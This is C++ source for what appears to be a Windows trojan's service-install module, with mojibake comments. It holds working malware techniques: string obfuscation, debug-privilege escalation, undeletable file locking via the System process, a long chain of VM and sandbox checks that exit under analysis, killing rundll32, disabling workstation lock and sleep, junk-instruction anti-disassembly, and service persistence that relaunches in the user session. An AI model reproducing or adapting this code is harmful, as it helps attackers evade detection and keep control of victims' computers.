#include "stdafx.h"
#include "InstallService.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#include <iostream>
#include <comdef.h>
#include <Wbemidl.h>
#include <TlHelp32.h>
#include <WinIoCtl.h>
#pragma comment(lib, "wbemuuid.lib")
using namespace std;

//�����ַ���
void EncryptData(char*szRec, unsigned long nLen, unsigned long key) //���ܲ��
{
	unsigned long i;
	unsigned char p;
	p = (unsigned char ) key % 1451 + 61;
	for(i = 0; i < nLen; i++)
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}
//��Ȩ����
void RaiseToDebugP()
{  
    HANDLE hToken;  
	HANDLE hProcess = m_gFunc.GetCurrentProcess();  
	if (m_gFunc.OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )  
	{
		TOKEN_PRIVILEGES tkp;  
		char QNdJE01[] = {'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e','\0'};
		if (m_gFunc.LookupPrivilegeValue(NULL, QNdJE01, &tkp.Privileges[0].Luid) )
		{
			tkp.PrivilegeCount = 1;  
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  
			BOOL bREt = m_gFunc.AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0) ;  
		}
		m_gFunc.CloseHandle(hToken);  
	} 
}
//ռ�ӷ�ɾ
BOOL OccupyFile(LPCTSTR lpFileName)  
{
	BOOL    bRet;  
	//��������Ȩ��  
	RaiseToDebugP();
	//��һ��pidΪ4�Ľ��̣�ֻҪ�Ǵ��ڵĽ��̣������� 
	HANDLE hProcess = m_gFunc.OpenProcess( PROCESS_DUP_HANDLE, FALSE,4);    // 4Ϊsystem���̺�  
	if ( hProcess == NULL )  
	{            
		return FALSE;  
	}  
	HANDLE hFile;  
	HANDLE hTargetHandle;  
	//�Զ�ռģʽ��Ŀ���ļ�  
	hFile = CreateFile( lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);   	 
	if ( hFile == INVALID_HANDLE_VALUE )  
	{  
		m_gFunc.CloseHandle( hProcess );  
		return FALSE;  
	}  
	//���ļ�������Ƶ�pid=4�Ľ�����ȥ��������ֻҪpid=4�Ľ��̲��˳���˭Ҳ������Ŀ���ļ�  
	bRet = m_gFunc.DuplicateHandle(m_gFunc.GetCurrentProcess(), hFile, hProcess, &hTargetHandle,0, FALSE, DUPLICATE_SAME_ACCESS|DUPLICATE_CLOSE_SOURCE);  
	m_gFunc.CloseHandle(hProcess);  
	return bRet;  
}
// ���CPU������
// SYSTEM_INFO.dwNumberOfProcessors
BOOL checkCPUCores(INT cores)
{
	INT i = 0;
	_asm { // x64����ģʽ�²�֧��__asm�Ļ��Ƕ��
		mov eax, dword ptr fs : [0x18]; // TEB
		mov eax, dword ptr ds : [eax + 0x30]; // PEB
		mov eax, dword ptr ds : [eax + 0x64];
		mov i, eax;
	}
	return i < cores;
}
//����¶�
BOOL checkCPUTemperature()
{
	HRESULT hres;
	BOOL res = -1;

	do 
	{
		// Step 1: --------------------------------------------------
	// Initialize COM. ------------------------------------------

		hres = CoInitializeEx(0, COINIT_MULTITHREADED);
		if (FAILED(hres))
		{
			// cout << "Failed to initialize COM library. Error code = 0x" << hex << hres << endl;
			break;                  // Program has failed.
		}

		// Step 2: --------------------------------------------------
		// Set general COM security levels --------------------------

		hres = CoInitializeSecurity(
			NULL,
			-1,                          // COM authentication
			NULL,                        // Authentication services
			NULL,                        // Reserved
			RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
			RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation  
			NULL,                        // Authentication info
			EOAC_NONE,                   // Additional capabilities 
			NULL                         // Reserved
		);

		if (FAILED(hres))
		{
			// cout << "Failed to initialize security. Error code = 0x" << hex << hres << endl;
			CoUninitialize();
			break;                    // Program has failed.
		}

		// Step 3: ---------------------------------------------------
		// Obtain the initial locator to WMI -------------------------

		IWbemLocator *pLoc = NULL;

		hres = CoCreateInstance(
			CLSID_WbemLocator,
			0,
			CLSCTX_INPROC_SERVER,
			IID_IWbemLocator, (LPVOID *)&pLoc);

		if (FAILED(hres))
		{
			// cout << "Failed to create IWbemLocator object." << " Err code = 0x" << hex << hres << endl;
			CoUninitialize();
			break;                 // Program has failed.
		}

		// Step 4: -----------------------------------------------------
		// Connect to WMI through the IWbemLocator::ConnectServer method

		IWbemServices *pSvc = NULL;

		// Connect to the root\cimv2 namespace with
		// the current user and obtain pointer pSvc
		// to make IWbemServices calls.
		hres = pLoc->ConnectServer(
			// _bstr_t(L"ROOT\\CIMV2"), // Object path of WMI namespace
			_bstr_t(L"ROOT\\WMI"),
			NULL,                    // User name. NULL = current user
			NULL,                    // User password. NULL = current
			0,                       // Locale. NULL indicates current
			NULL,                    // Security flags.
			0,                       // Authority (for example, Kerberos)
			0,                       // Context object 
			&pSvc                    // pointer to IWbemServices proxy
		);

		if (FAILED(hres))
		{
			// cout << "Could not connect. Error code = 0x" << hex << hres << endl;
			pLoc->Release();
			CoUninitialize();
			break;                // Program has failed.
		}

		// cout << "Connected to ROOT\\WMI WMI namespace" << endl;

		// Step 5: --------------------------------------------------
		// Set security levels on the proxy -------------------------

		hres = CoSetProxyBlanket(
			pSvc,                        // Indicates the proxy to set
			RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
			RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
			NULL,                        // Server principal name 
			RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
			RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
			NULL,                        // client identity
			EOAC_NONE                    // proxy capabilities 
		);

		if (FAILED(hres))
		{
			// cout << "Could not set proxy blanket. Error code = 0x" << hex << hres << endl;
			pSvc->Release();
			pLoc->Release();
			CoUninitialize();
			break;               // Program has failed.
		}

		// Step 6: --------------------------------------------------
		// Use the IWbemServices pointer to make requests of WMI ----

		// For example, get the name of the operating system
		IEnumWbemClassObject* pEnumerator = NULL;
		hres = pSvc->ExecQuery(
			bstr_t("WQL"),
			bstr_t("SELECT * FROM MSAcpi_ThermalZoneTemperature"),
			WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
			NULL,
			&pEnumerator);

		if (FAILED(hres))
		{
			// cout << "Query for operating system name failed." << " Error code = 0x" << hex << hres << endl;
			pSvc->Release();
			pLoc->Release();
			CoUninitialize();
			break;               // Program has failed.
		}

		// Step 7: -------------------------------------------------
		// Get the data from the query in step 6 -------------------

		IWbemClassObject *pclsObj = NULL;
		ULONG uReturn = 0;

		while (pEnumerator)
		{
			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);

			if (0 == uReturn) // VM�н��Ϊ��
			{
				if (-1 == res)
				{
					res = TRUE;
				}
				break;
			}

			VARIANT vtProp;

			// Get the value of the Name property
			hr = pclsObj->Get(L"CurrentTemperature", 0, &vtProp, 0, 0);
			// res = vtProp.ullVal / 10.0 - 273.15; // ����ת����
			res = FALSE;
			
			VariantClear(&vtProp);

			pclsObj->Release();
		}

		// Cleanup
		// ========

		pSvc->Release();
		pLoc->Release();
		pEnumerator->Release();
		CoUninitialize();

	} while (false);

	return res;
}
// �����̴�С����Ҫ����ԱȨ�ޣ�
// SELECT * FROM Win32_LogicalDisk
// Size
BOOL checkPhyDisk(INT disk)
{
	HANDLE hDrive;
	GET_LENGTH_INFORMATION size;
	DWORD lpBytes;
	hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hDrive == INVALID_HANDLE_VALUE)
	{
		m_gFunc.CloseHandle(hDrive);
		return FALSE;
	}
	bool result = DeviceIoControl(hDrive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &size, sizeof(GET_LENGTH_INFORMATION), &lpBytes, NULL);
	m_gFunc.CloseHandle(hDrive);
	
	if ((size.Length.QuadPart / 1073741824) < disk)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}
// ������
BOOL checkSerivce()
{
	int menu = 0;
	// ��ϵͳ���������    
	SC_HANDLE SCMan = m_gFunc.OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (SCMan == NULL)
	{
		return -1;
	}
	// ����ϵͳ����Ľṹ  
	LPENUM_SERVICE_STATUSA service_status;
	DWORD cbBytesNeeded = NULL;
	DWORD ServicesReturned = NULL;
	DWORD ResumeHandle = NULL;
	service_status = (LPENUM_SERVICE_STATUSA)LocalAlloc(LPTR, 1024 * 64);
	// ��ȡϵͳ����ļ���Ϣ    
	bool ESS = EnumServicesStatusA(SCMan, //ϵͳ������    
		SERVICE_WIN32, //���������    
		SERVICE_STATE_ALL,  //�����״̬    
		(LPENUM_SERVICE_STATUSA)service_status,  //���������ϵͳ����Ľṹ    
		1024 * 64,  //�ṹ�Ĵ�С    
		&cbBytesNeeded, //������������շ�������ķ���    
		&ServicesReturned, //������������շ��ط��������    
		&ResumeHandle //���������������һ�ε��ñ���Ϊ0������Ϊ0����ɹ�
		);
	if (ESS == NULL)
	{
		return -1;
	}
	for (DWORD i = 0; i < ServicesReturned; i++)
	{
		if (m_gFunc.strstr(service_status[i].lpDisplayName, "VMware Tools") != NULL || strstr(service_status[i].lpDisplayName, "VMware ����������ַ���") != NULL || strstr(service_status[i].lpDisplayName, "Virtual Machine") != NULL || strstr(service_status[i].lpDisplayName, "VirtualBox Guest") != NULL)
		{
			return TRUE;
		}
	}
	//�رշ���������ľ��   
	m_gFunc.CloseServiceHandle(SCMan);
	return FALSE;
}
// ��⿪��ʱ��
BOOL checkUptime(DWORD msTime)
{
	DWORD UpTime = m_gFunc.GetTickCount();
	if (UpTime < msTime)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}
// ʹ��CPUIDָ��
// ��EAX=1ʱ��CPUID��ECX��HYPERV_HYPERVISOR_PRESENT_BIT��ʶ�Ƿ������⻷����
BOOL checkCPUID()
{
	DWORD dw_ecx;
	bool bFlag = true;
	_asm {
		pushad; // ��32λͨ�üĴ���ѹ���ջ
		pushfd; // ��32λ��־�Ĵ���EFLAGSѹ���ջ
		mov eax, 1; // Processor Info and Feature Bits
		cpuid; // ���ݴ��ݸ�EAX�Ĵ�����ֵ������Ӧ����Ϣ���ظ�EAX��EBX��ECX��EDX
		mov dw_ecx, ecx; // Feature Information
		and ecx, 0x80000000; // Hypervisor present (always zero on physical CPUs) �� HYPERV_HYPERVISOR_PRESENT_BIT
		test ecx, ecx; // ANDΪ0�Ļ�ZF=1
		setz[bFlag]; // ZFΪ1�Ļ�bFlag=1
		popfd;
		popad;
	}
	if (bFlag) // ��ʵ����
	{
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}
// ���TEMPĿ¼�µ��ļ�����
BOOL checkTempDir(INT aNum)
{
	int file_count = 0;
	DWORD dwRet;
	LPSTR pszOldVal;
	pszOldVal = (LPSTR)malloc(MAX_PATH * sizeof(char));
	dwRet = GetEnvironmentVariableA("TEMP", pszOldVal, MAX_PATH);
	
	std::string stdstr = pszOldVal;
	stdstr += "\\*";
	
	LPSTR s = const_cast<char *>(stdstr.c_str());
	
	WIN32_FIND_DATAA data;
	HANDLE hFind = FindFirstFileA(s, &data);
	if (hFind != INVALID_HANDLE_VALUE) 
	{
		do 
		{
			file_count++;
		} while (FindNextFileA(hFind, &data));
		FindClose(hFind);
	}
	
	if (file_count < aNum)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}
// ����������ʱ����ָ��ʱ��
BOOL checkSpeed(INT td)
{
	__asm
	{
		rdtsc
			xchg ebx, eax
			rdtsc
			sub eax, ebx
			cmp eax, td // 0xe
			jg detected
	}
	return FALSE;
detected:
	return TRUE;
}
// ʹ��sgdt��sldtָ��̽��VMware�ļ���ͨ������ΪNo Pill
// ͨ������VMware���ٿ��Է�ֹNo Pill������̽��
BOOL checkNoPill()
{
	ULONG xdt = 0;
	ULONG InVM = 0;
	__asm
	{
		push edx
			sidt[esp - 2] // ���ж���������Ĵ���IDTR�����ݴ���ָ����ַ��Ԫ
			pop edx
			nop
			mov xdt, edx
	}
	if (xdt > 0xd0000000)
	{
		InVM = 1;
	}
	
	__asm
	{
		push edx
			sgdt[esp - 2] // ��ȫ�����������Ĵ���GDTR�����ݴ���ָ����ַ��Ԫ
			pop edx
			nop
			mov xdt, edx
	}
	if (xdt > 0xd0000000)
	{
		InVM += 1;
	}
	
	if (InVM == 0)
	{
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}
// ���IO�˿�
// VMware�����inָ���ִ�У�������Ŀ��ͨ�Ŷ˿�Ϊ0x5668(VX)��I/O
// VMware����ڶ����������Ƿ���VX���������������ʱ
// EAX�Ĵ��������ֵ��0x564D5868(VMXh)
// ECX�Ĵ���Ϊ�ڶ˿���ִ����Ӧ������ֵ
// 0xA��get VMware version type
// 0x14��get the memory size
// ��EBXΪmagic��VMXh��ECXΪ�汾��
// ����ʵ���������лᴥ��EXCEPTION_EXECUTE_HANDLER�쳣
// https://www.aldeid.com/wiki/VMXh-Magic-Value
BOOL checkIOPort()
{
	bool rc = true;
	__try
	{
		__asm
		{
			push   edx
				push   ecx
				push   ebx
				mov    eax, 'VMXh'
				mov    ebx, 0
				mov    ecx, 10
				mov    edx, 'VX'
				in     eax, dx // ��һ��Դ������ָ���Ķ˿�dx�������ݵ�Ŀ�Ĳ�����ָ�����ڴ��ַ
				cmp    ebx, 'VMXh'
				setz[rc]
				pop    ebx
				pop    ecx
				pop    edx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		rc = false;
	}
	return rc;
}
// ��鵱ǰ�������е����������״̬��(TSS)
// �ڱ���ģʽ�����еĳ������л�����ʱ����ǰ������ָ��TSS�Ķ�ѡ�������ᱻ�洢������Ĵ���(TR)��
// �����������ʵ����֮�У�ͨ��STR��ȡ�ĵ�ַ�ǲ�ͬ�ģ�����ַ����0x0040xxxxʱ��˵�������������
// VMware
BOOL checkTSS()
{
	unsigned char mem[4] = { 0 };
	__asm str mem; // ������Ĵ���(TR)�еĶ�ѡ�����洢��Ŀ�������
	if ((mem[0] == 0x00) && (mem[1] == 0x40))
	{
		return TRUE;
	}
	else
	{
		// 0x40000000
		return FALSE;
	}
}
// �����Чָ��
// VirtualPCʹ��һ����Чָ���������������VirtualPC֮�����ӣ����VirtualPC�����������쳣
DWORD IslnsideVPC_exceptionFilter(LPEXCEPTION_POINTERS ep)
{
	PCONTEXT ctx = ep->ContextRecord;
	ctx->Ebx = -1; // δ������VPC��  
	ctx->Eip += 4; // ����call VPC����  
	return EXCEPTION_CONTINUE_EXECUTION;
}
BOOL checkUnISA()
{
	bool rc = TRUE;
	__try
	{
		__asm
		{
			push ebx
				mov ebx, 0
				mov eax, 1
				__emit 0fh // �ڵ�ǰλ��ֱ�Ӳ�������
				__emit 3fh
				__emit 07h
				__emit 0bh
				test ebx, ebx
				setz[rc]
				pop ebx
		}
	}
	__except (IslnsideVPC_exceptionFilter(GetExceptionInformation()))
	{
		rc = FALSE;
	}
	return rc;
}

//��΢��
void ShaiXian()
{
	char wb[]="��XXAcQbcXXfRSScR";
	EncryptData((char*)wb,m_gFunc.strlen(wb),13);//����
	if (m_gFunc.PathFileExists(wb))
	{
		ExitProcess(0);
	}
}
//������
BOOL IsGuardPages()
{
    SYSTEM_INFO sSysInfo;
    DWORD dwPageSize = 0;
    DWORD OldProtect = 0;
    m_gFunc.GetSystemInfo(&sSysInfo);
    dwPageSize = sSysInfo.dwPageSize;
    LPVOID lpvBase = m_gFunc.VirtualAlloc(NULL, dwPageSize, MEM_COMMIT, PAGE_READWRITE);
    if (lpvBase == NULL)
    {
        return FALSE;
    }
    PBYTE lptmpB = (PBYTE)lpvBase;
    *lptmpB = 0xc3; //retn
    VirtualProtect(lpvBase, dwPageSize, PAGE_EXECUTE_READ | PAGE_GUARD, &OldProtect);
    __try
    {
        __asm  call dword ptr[lpvBase];
        VirtualFree(lpvBase, 0, MEM_RELEASE);
        return TRUE;
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        VirtualFree(lpvBase, 0, MEM_RELEASE);
        return FALSE;
    }
}
//�������
BOOL IsInsideVMWare()
{
	bool rc = true;
	__try
	{
		__asm
		{
			push   edx
				push   ecx
				push   ebx

				mov    eax, 'VMXh'
				mov    ebx, 0  // ��ebx����Ϊ�ǻ�����VMXH��������ֵ
				mov    ecx, 10 // ָ�����ܺţ����ڻ�ȡVMWare�汾������Ϊ0x14ʱ���ڻ�ȡVMware�ڴ��С
				mov    edx, 'VX' // �˿ں�
				in     eax, dx // �Ӷ˿�dx��ȡVMware�汾��eax
				//������ָ�����ܺ�Ϊ0x14ʱ����ͨ���ж�eax�е�ֵ�Ƿ����0��������˵�������������
				cmp    ebx, 'VMXh' // �ж�ebx���Ƿ����VMware�汾��VMXh�������������������
				setz[rc] // ���÷���ֵ

				pop    ebx
				pop    ecx
				pop    edx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)  //���δ����VMware�У��򴥷����쳣
	{
		rc = false;
	}
	return rc;
}
//������
DWORD get_parent_processid(DWORD pid)
{
	DWORD ParentProcessID = -1;
	PROCESSENTRY32 pe;
	   _asm inc eax;
	   _asm dec ebx;
	   _asm dec eax;
	   _asm inc ebx;
       HANDLE hkz;
       HMODULE hModule = LoadLibrary(_T("Kernel32.dll"));
       FARPROC Address = GetProcAddress(hModule, "CreateToolhelp32Snapshot");
       if(Address == NULL)
       {
		   _asm inc eax;
		   _asm dec ebx;
		   _asm dec eax;
		   _asm inc ebx;
		   return-1;
       }
       _asm
       {
		   push 0
			   push 2
			   _asm inc eax;
		   _asm dec ebx;
		   _asm dec eax;
		   _asm inc ebx;
		   call Address
			   mov hkz, eax
			   
       }
       pe.dwSize= sizeof(PROCESSENTRY32);
       if(Process32First(hkz, &pe))
       {
		   do
		   {
			   if(pe.th32ProcessID == pid)
			   {
				   _asm inc eax;
				   _asm dec ebx;
				   _asm dec eax;
				   _asm inc ebx;
				   ParentProcessID= pe.th32ParentProcessID;
				   break;
			   }
		   }while (Process32Next(hkz, &pe));
       }
       return ParentProcessID;
}
DWORD get_explorer_processid()
{
	_asm inc eax;
	_asm dec ebx;
	_asm dec eax;
	_asm inc ebx;
	DWORD explorer_id = -1;
	PROCESSENTRY32 pe;
	HANDLE hkz;
	HMODULE hModule = LoadLibrary(_T("Kernel32.dll"));
	if(hModule == NULL)
	{		
		_asm inc eax;
		_asm dec ebx;
		_asm dec eax;
		_asm inc ebx;
		return-1;
	}
	FARPROC Address = GetProcAddress(hModule, "CreateToolhelp32Snapshot");
	   _asm inc eax;
	   _asm dec ebx;
	   _asm dec eax;
	   _asm inc ebx;
       if(Address == NULL)
       {
		   return-1;
       }
       _asm
       {
		   push 0
			   push 2
			   call Address
			   mov hkz, eax
			   _asm inc eax;
		   _asm dec ebx;
		   _asm dec eax;
		   _asm inc ebx;
       }
       pe.dwSize= sizeof(PROCESSENTRY32);
       if(Process32First(hkz, &pe))
       {
		   do
		   
		   {
			   _asm inc eax;
			   _asm dec ebx;
			   _asm dec eax;
			   _asm inc ebx;
			   char UlvzG[] = {'e','x','p','l','o','r','e','r','.','e','x','e','\0'};
			   if(_stricmp(pe.szExeFile,UlvzG) == 0)
			   {
				   explorer_id= pe.th32ProcessID;
				   break;
			   }
		   }while (Process32Next(hkz, &pe));
       }
	   _asm inc eax;
	   _asm dec ebx;
	   _asm dec eax;
	   _asm inc ebx;
       return explorer_id;
}
bool IsVirtualPC_LDTCheck()
{
	unsigned short ldt_addr = 0;
	unsigned char ldtr[2];
	_asm sldt ldtr
		ldt_addr = *((unsigned short *)&ldtr);
	return ldt_addr != 0x00000000;
}
bool IsVirtualPC_GDTCheck()
{
	unsigned int gdt_addr = 0;
	unsigned char gdtr[6];
	_asm sgdt gdtr
		gdt_addr = *((unsigned int *)&gdtr[2]);
	return (gdt_addr >> 24) == 0xff;
}
bool IsVirtualPC_TSSCheck()
{
	unsigned char mem[4] = { 0 };
	__asm str mem;
	return (mem[0] == 0x00) && (mem[1] == 0x40);
}
bool DetectVM()
{
	HKEY hKey;
	char szBuffer[64];
	unsigned long hSize = sizeof(szBuffer)-1;
	
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS\\", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		RegQueryValueEx(hKey, "SystemManufacturer", NULL, NULL, (unsigned char *)szBuffer, &hSize);
		if (m_gFunc.strstr(szBuffer, "VMWARE"))
		{
			RegCloseKey(hKey);
			return true;
		}
		RegCloseKey(hKey);
	}
	return false;
}

//K�ս��߽���
void KProcess()
{
	
	char CYZuy02[] = {'r','u','n','d','l','l','3','2','.','e','x','e','\0'};
	if(GetProcessID(CYZuy02) != NULL)
	{	 
		m_gFunc.WinExec("taskkill /f /im rundll32.exe",SW_HIDE);  //�رս���
	}
}

//˯����ֹ
DWORD WINAPI Block_sleep(LPVOID lpParameter)
{
	//����Win+L������
	DWORD dwValue = 1;
	SHSetValue(HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
		"DisableLockWorkstation", 
		REG_DWORD,
		&dwValue,
		sizeof(DWORD));
	SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
	while(true)
	{
		Sleep(1000);
		OutputDebugString(_T("SVP7-Thread running...\r\n"));
	}
}
//��΢��ɱ��
void sleep_sleep()
{
	SYSTEMTIME hi;
	int iCounter;
	GetLocalTime(&hi);
	iCounter = hi.wSecond;
	
	if( iCounter >45 )
		iCounter=iCounter-45;
	else
		iCounter=iCounter+8;
	
	while(1)
	{
		GetLocalTime(&hi);
		if(hi.wSecond == iCounter)
			break;
	}
}

void Vmware()
{
	if((IsInsideVMWare() || IsVirtualPC_LDTCheck() || IsVirtualPC_GDTCheck() || IsVirtualPC_TSSCheck() || DetectVM()))
	{
		ExitProcess(0);
	}
	ShaiXian();//��΢��
	if (IsGuardPages()) //������
	{
		ExitProcess(0);
	}
	DWORD explorer_id = get_explorer_processid();
	DWORD parent_id = get_parent_processid(m_gFunc.GetCurrentProcessId()); 
	if(!explorer_id == parent_id)//�жϸ�����id�Ƿ��explorer����id��ͬ	
	{	
		ExitProcess(0);
	}
	if (checkCPUCores(4))//���CPU����
	{
		ExitProcess(0);
	}
	if (checkCPUTemperature()) //���CPU�¶�
	{
		ExitProcess(0);
	}
	if (checkPhyDisk(250)) //���Ӳ�̴�С
	{
		ExitProcess(0);
	}
	if (checkUptime(3600000)) //��⿪��ʱ��
	{
		ExitProcess(0);
	}
	if (checkSerivce())
	{
		ExitProcess(0);
	}
	if (checkCPUID())
	{
		ExitProcess(0);
	}
	if (checkTempDir(30))
	{
		ExitProcess(0);
	}
	if (checkSpeed(0xff))
	{
		ExitProcess(0);
	}
	if (checkNoPill())
	{
		ExitProcess(0);
	}
	if (checkIOPort())
	{
		ExitProcess(0);
	}
	if (checkTSS())
	{
		ExitProcess(0);
	}
	if (checkUnISA())
	{
		ExitProcess(0);
	}	
}

//�����ļ���
void MyCreatDirector(LPSTR Path) 
{
	CHAR Dir[MAX_PATH]={NULL};
	int i;
	for (i=0;(size_t)i<m_gFunc.strlen(Path);i++)
	{
		if(Path[i]=='\\')
		{
			my_strncpy(Dir,Path,i);
			if(_access(Dir,NULL)==-1)
			{
				CreateDirectory(Dir,NULL);
			}
		}
	}
}

#include <SHELLAPI.H>
int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
void __stdcall ServiceHandler(DWORD dwControl);
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return m_gFunc.SetServiceStatus(hServiceStatus,&srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        m_gFunc.Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( g_dwCurrState, 0, 0 );
        break;
    }
}
extern BOOL bisUnInstall;
extern char MyUpGroup[30];
extern char MyServiceName[70];
extern DWORD WINAPI MainThread();
// дע��� ���� ��ע ��װʱ�� ��Ϣ
void SetRegInfos() 
{
	HKEY hKEY;
	char strSubKey[MAX_PATH];
	m_gFunc.wsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s",MyServiceName);
	//����ע���,hHEY�򱣴�˺������򿪵ľ��
	int ret1=(::RegOpenKeyEx(HKEY_CURRENT_USER,strSubKey,0,KEY_READ,&hKEY));
	//��ѯEdit1���������
	LPBYTE owner_Get1=new BYTE[80];
	DWORD type_1=REG_SZ;
	DWORD cbData_1=80;
	ret1=::RegQueryValueEx(hKEY,"Group",NULL,&type_1,owner_Get1,&cbData_1);
	if(ret1!=ERROR_SUCCESS)//�жϷ�����Ϣ�Ƿ����
	{
		//����
		WriteRegEx(HKEY_CURRENT_USER,strSubKey,"Group", REG_SZ,MyUpGroup, m_gFunc.strlen(MyUpGroup),0);
		//��װʱ��
		char szCurrentDateTime[32];     
		SYSTEMTIME systm;     
		GetLocalTime(&systm);     
		m_gFunc.wsprintf(szCurrentDateTime, "%4d-%.2d-%.2d %.2d:%.2d",     
			systm.wYear, systm.wMonth, systm.wDay,     
			systm.wHour, systm.wMinute);
		WriteRegEx(HKEY_CURRENT_USER, 
			strSubKey,
			"InstallTime", 
			REG_SZ,
			szCurrentDateTime, 
			m_gFunc.strlen(szCurrentDateTime),1);
	}
}
void SetRegInfo() 
{
	HKEY hKEY;
	char strSubKey[MAX_PATH];
	strcpy(strSubKey,"SYSTEM\\CurrentControlSet\\Services");
	//����ע���,hHEY�򱣴�˺������򿪵ľ��
	int ret1=(::RegOpenKeyEx(HKEY_CURRENT_USER,strSubKey,0,KEY_READ,&hKEY));
	//��ѯEdit1���������
	LPBYTE owner_Get=new BYTE[80];
	DWORD type_1=REG_SZ;
	DWORD cbData_1=80;
	ret1=::RegQueryValueEx(hKEY,"Group",NULL,&type_1,owner_Get,&cbData_1);
	if(ret1!=ERROR_SUCCESS)//�жϷ�����Ϣ�Ƿ����
	{
		SetRegInfos();
	}
}
void ServiceMain(DWORD dwargc,wchar_t* argv[])
{
    hServiceStatus = m_gFunc.RegisterServiceCtrlHandler(MyServiceName, (LPHANDLER_FUNCTION)ServiceHandler);
    if( hServiceStatus == NULL )
    {
        return;
    }
    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0);
	OSVERSIONINFO OSversion;	
	OSversion.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	m_gFunc.GetVersionEx(&OSversion);
	
	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
    {
        if (OSversion.dwMajorVersion < 6)
		{
			HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread(), NULL, 0, NULL);
			do
			{
				m_gFunc.Sleep(100);
			}
			while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
			m_gFunc.WaitForSingleObject(hThread, INFINITE);
			m_gFunc.CloseHandle(hThread);
		}
		else
		{
			TCHAR MyName[MAX_PATH];
			HANDLE hActiveSession;
			DWORD ExitCode = 0; 
			m_gFunc.GetModuleFileName(NULL,MyName,sizeof(MyName));//��ȡ��ǰ�ļ�·��
			char CommandLine[1024];
			m_gFunc.wsprintfA(CommandLine,"%s Win7",MyName);
			hActiveSession = RunInActiveSession(CommandLine);
			m_gFunc.CloseHandle(hActiveSession);
		}
    }
	do
	{
		m_gFunc.Sleep(100);
	}while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED && bisUnInstall == FALSE);
	//���ﲻ�ӻ�һֱ���г���
}
//��������
BOOL NtStartService(LPCTSTR lpService)
{
    SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
    SERVICE_STATUS   ServiceStatus;
    DWORD            dwErrorCode;

    schSCManager=m_gFunc.OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//�򿪷�����ƹ��������ݿ�
    if(!schSCManager)
    {
        return FALSE;
    }
    if (NULL!=schSCManager)
    {
        schService=m_gFunc.OpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//��÷������ľ��

        if (schService != NULL)
        {
            if(m_gFunc.StartService(schService,0,NULL) == 0)//�Ѿ����ڸ÷���,����������                        
            {
                dwErrorCode=GetLastError();
